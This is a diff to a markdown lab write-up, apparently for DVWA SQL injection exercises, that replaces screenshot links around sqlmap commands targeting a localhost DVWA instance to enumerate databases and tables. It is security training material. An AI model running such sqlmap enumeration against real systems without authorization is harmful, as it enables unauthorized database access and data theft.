@@ -229,7 +229,8 @@ Password: password <br>
 Use the command below to get information about all available databases
 <br>
 Before Attack
-![image](https://github.com/user-attachments/assets/7ca08183-d113-435c-b96c-ef80ff94019c)
+![image](https://github.com/user-attachments/assets/c62b7d66-d79e-4b9f-b71c-2857f7a47a04)
+
 
 ```
 python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" --dbs
@@ -242,7 +243,8 @@ python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Sub
 **Answer 2**:
 <br>
 Before Attack
-![image](https://github.com/user-attachments/assets/ed3b3dea-25bc-46c8-8082-9684e773b2e4)
+![image](https://github.com/user-attachments/assets/503d942b-fbb9-495e-afd0-6cc4131f58d6)
+
 
 ```
 python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" -D dvwa --tables
